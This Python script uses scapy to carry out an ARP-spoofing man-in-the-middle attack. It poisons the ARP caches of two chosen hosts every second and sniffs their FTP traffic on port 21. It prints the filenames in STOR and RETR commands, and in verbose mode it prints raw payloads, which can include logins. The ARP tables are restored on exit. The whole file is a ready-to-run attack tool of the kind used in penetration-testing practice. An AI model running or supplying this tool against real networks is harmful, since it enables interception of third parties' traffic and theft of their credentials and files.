#!/usr/bin/env python3

import scapy.all as scapy
from scapy.all import TCP, Raw
import argparse
import time
import sys
import threading

# take 4 arguments IP-src, Mac-src, IP-dst, Mac-dst
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--src_ip", dest="src_ip", help="IP Address of the source.")
    parser.add_argument("-m", "--src_mac", dest="src_mac", help="MAC Address of the source.")
    parser.add_argument("-d", "--dst_ip", dest="dst_ip", help="IP Address of the destination.")
    parser.add_argument("-n", "--dst_mac", dest="dst_mac", help="MAC Address of the destination.")
    parser.add_argument("-v", "--verbose", dest="verbose", help="Verbose mode", action="store_true")
    options = parser.parse_args()
    if not options.src_ip:
        parser.error("[-] Please specify an IP Address of the source machine, use --help for more info.")
    elif not options.src_mac:
        parser.error("[-] Please specify a MAC Address of the source machine, use --help for more info.")
    elif not options.dst_ip:
        parser.error("[-] Please specify an IP Address of the destination machine, use --help for more info.")
    elif not options.dst_mac:
        parser.error("[-] Please specify a MAC Address of the destination machine, use --help for more info.")
    return options
  
def spoof(target_ip: str, target_mac: str, spoof_ip: str) -> None:
    spoof_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether_frame = scapy.Ether(dst=target_mac) / spoof_packet
    scapy.sendp(ether_frame, verbose = False)
    
def restore(source_ip: str, source_mac: str, destination_ip: str, destination_mac: str) -> None:
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    ether_frame = scapy.Ether(dst=destination_mac) / restore_packet
    scapy.sendp(ether_frame, count=5, verbose = False)

def sniffer(interface: str, stop_event: any, verbose: str | None) -> None:
    try:
        sniffer = scapy.AsyncSniffer(
            iface=interface,
            store=False,
            prn=lambda packet: process_packet(packet, verbose),
        )
        sniffer.start()  # Start sniffing in background
        print("[+] Sniffer Started.")
        stop_event.wait()  # Blocks until stop_event is set
        sniffer.stop()  # Stop sniffing when event is triggered
        # print("[-] Sniffer Stopped.")
    except Exception:
        sniffer.stop()
    finally:
        print("[-] Sniffer Stopped.")

def process_packet(packet, verbose):
    if packet.haslayer(TCP) and (packet[TCP].sport == 21 or packet[TCP].dport == 21) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors="ignore")
        if verbose:
            print(f"[VERBOSE] {payload.strip()}")
        elif payload.startswith("STOR") or payload.startswith("RETR"):
            command, filename = payload.split(" ", 1)
            print(f"[FTP] {command.strip()} -> {filename.strip()}")

def scan(ip: str) -> str | None:
    try:
        arp_req_frame = scapy.ARP(pdst = ip)
        broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")   
        broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
        answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        return None

def main() -> None:
    options = get_args()
    src_ip = options.src_ip
    src_mac = options.src_mac
    dst_ip = options.dst_ip
    dst_mac = options.dst_mac
    verbose = options.verbose
    interface = "eth0"

    # check if the MAC address is valid
    smac = scan(src_ip)
    dmac = scan(dst_ip)
    if not smac or smac != src_mac:
        print(f"[{src_ip}] The IP Address is not valid.")
        sys.exit(1)
    if not dmac or dmac != dst_mac:
        print(f"[{dst_ip}] The IP Address is not valid.")
        sys.exit(1)

    # create a thread for sniffer
    stop_sniffer = threading.Event()
    sniffer_thread = threading.Thread(target=sniffer, args=(interface, stop_sniffer, verbose))
    sniffer_thread.start()

    # start spoofing
    print("[+] Starting ARP Spoofing")
    while True:
        try:
            spoof(src_ip, src_mac, dst_ip)
            spoof(dst_ip, dst_mac, src_ip)
            time.sleep(1)     
        except KeyboardInterrupt:  
            print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
            stop_sniffer.set()
            restore(src_ip, src_mac, dst_ip, dst_mac)
            restore(dst_ip, dst_mac, src_ip, src_mac)
            break  
    sniffer_thread.join()

if __name__ == "__main__":
    main()